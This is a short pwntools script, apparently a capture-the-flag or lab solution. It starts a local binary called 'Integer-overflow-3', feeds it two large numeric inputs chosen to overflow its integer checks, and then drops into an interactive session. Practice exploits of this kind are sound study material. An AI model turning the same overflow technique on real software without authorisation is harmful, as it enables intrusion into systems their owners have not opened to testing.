from pwn import *

p = process('./Integer-overflow-3')

payload = b"4294965327" 
p.sendline(payload)
payload = b"2147489647" 
p.sendline(payload)

p.interactive()


